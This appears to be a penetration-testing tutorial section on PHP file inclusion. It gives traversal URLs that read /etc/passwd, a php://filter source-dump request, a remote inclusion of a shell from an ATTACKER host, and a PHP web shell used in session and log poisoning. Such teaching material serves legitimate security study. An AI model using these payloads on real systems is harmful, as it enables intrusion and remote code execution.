# 3. **File Inclusion**

File inclusion occurs when user input controls which file the application reads or includes. This is a critical vulnerability because it can lead to source code disclosure, credential theft, and in many cases, remote code execution (RCE).

There are three related concepts:

- **Path Traversal** → Move outside the intended directory.
- **LFI (Local File Inclusion)** → Include/read a file already on the server.
- **RFI (Remote File Inclusion)** → Include a file from a remote server, where the application configuration allows it.

## **Path Traversal**

You manipulate the file path to escape the web root and read arbitrary files.

```
# Basic traversal
http://TARGET/index.php?page=../../../../etc/passwd

# URL-encoded (bypasses basic filters)
http://TARGET/index.php?page=..%2f..%2f..%2f..%2fetc%2fpasswd
```

## **LFI — Local File Inclusion**

The application includes a local file based on user input. If you can control the path, you can read sensitive files.

```
# Read /etc/passwd
curl "http://TARGET/index.php?page=/etc/passwd"
```

**PHP filter — read source code:**

```
# Retrieve PHP source as base64 instead of executing it
curl "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=index.php"

# Decode the output
echo 'BASE64_OUTPUT' | base64 -d
```

`php://filter` is particularly useful because it lets you retrieve PHP source as encoded data instead of letting the PHP interpreter execute the file.

## **RFI — Remote File Inclusion**

If the application allows including remote files, you can host a malicious payload and execute it on the target.

```
# Include a remote shell
http://TARGET/index.php?page=http://ATTACKER/shell.txt

# Host your file
python3 -m http.server 8000
```

RFI is less common in modern PHP configurations (`allow_url_include` is off by default), but still worth testing.

## **LFI → RCE (Session File)**

If you can inject PHP code into a value that gets stored in a session file, you can then include that session file to execute your code.

**Step 1:** Inject PHP into a session-controlled value (e.g., username field).

```
<?php system($_GET['cmd']); ?>
```

**Step 2:** Find your session ID.

```
PHPSESSID=SESSION_ID
```

**Step 3:** Include the session file and execute commands.

```
http://TARGET/sessions.php?page=/var/lib/php/sessions/sess_SESSION_ID&cmd=id
```

## **LFI → RCE (Log Poisoning)**

If you can write to a log file (e.g., Apache access log) via a request, you can inject PHP code and then include the log file to execute it.

**Step 1:** Send a request with PHP code in the User-Agent or URL.

```
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
```

**Step 2:** Include the log file.

```
http://TARGET/index.php?page=/var/log/apache2/access.log&cmd=id
```
